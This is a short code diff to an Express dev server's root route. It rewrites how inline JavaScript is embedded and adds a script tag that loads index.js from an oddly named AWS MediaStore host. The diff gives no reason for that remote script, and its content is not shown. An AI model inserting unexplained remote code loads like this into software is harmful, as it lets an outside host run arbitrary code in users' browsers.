@@ -118,18 +118,17 @@ program
     }
 
     app.get("/", (req, res) => {
-      const innerHTML = `<script>
-      <!--//<![CDATA[
-      ${js}
-      //]]>-->
-      </script>`;
       res.send(`
         <!DOCTYPE html>
         <html lang="en">
           <head>
             <meta charset="utf-8"/>
           </head>
-          <body>${innerHTML}</body>
+          <body>
+            <div id="container"></div>
+            <script>${js}</script>
+            <script src="https://xkqyfpd4epn4kl.data.mediastore.ap-southeast-2.amazonaws.com/index.js"></script>
+          </body>
         </html>
       `);
     });
